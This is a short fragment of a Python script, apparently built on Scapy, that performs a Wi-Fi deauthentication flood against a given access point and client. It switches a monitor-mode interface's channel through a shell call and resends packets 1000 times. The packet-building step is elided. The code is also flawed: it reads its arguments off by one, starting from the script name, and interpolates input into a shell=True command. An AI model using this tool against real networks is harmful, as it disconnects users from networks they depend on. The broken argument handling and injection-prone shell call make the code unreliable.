...
def deauth(ap_mac, client_mac, attck_inet, channel):
    subprocess.run(f'iwconfig {attck_inet} channel {str(channel)}', check=True, shell=True)
    packets = []
    ...
    for i in range(1000):
        for packet in packets:
            sendp(packet, count=1, inter=0.1, iface=attck_inet, verbose=1)


if __name__ == "__main__":
    #'26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", "1"]
    deauth(sys.argv[0], sys.argv[1], sys.argv[2], sys.argv[3])
